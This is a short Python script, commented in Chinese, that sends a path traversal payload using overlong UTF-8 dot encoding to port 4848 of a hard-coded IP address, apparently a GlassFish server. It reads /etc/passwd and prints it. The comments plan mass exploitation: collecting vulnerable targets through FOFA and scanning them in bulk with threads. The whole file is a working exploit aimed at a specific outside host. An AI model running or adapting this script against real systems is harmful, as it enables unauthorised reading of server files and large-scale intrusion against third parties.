import requests

# todo 如果访问的页面提示不安全，在python中应该怎么通过requests访问得到结果

'''
如何实现这个漏洞的批量化：
1.获取到可能存在漏洞的地址信息-借助fofa进行获取目标
2. 将请求的数据进行筛选
2.批量请求地址信息进行判断是否存在-单线程和多线程
'''
url = 'http://96.126.120.39:4848'


payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
target_linux = url + payload_linux

res_linux = requests.get(url=target_linux)

print(res_linux.content.decode('utf-8'))


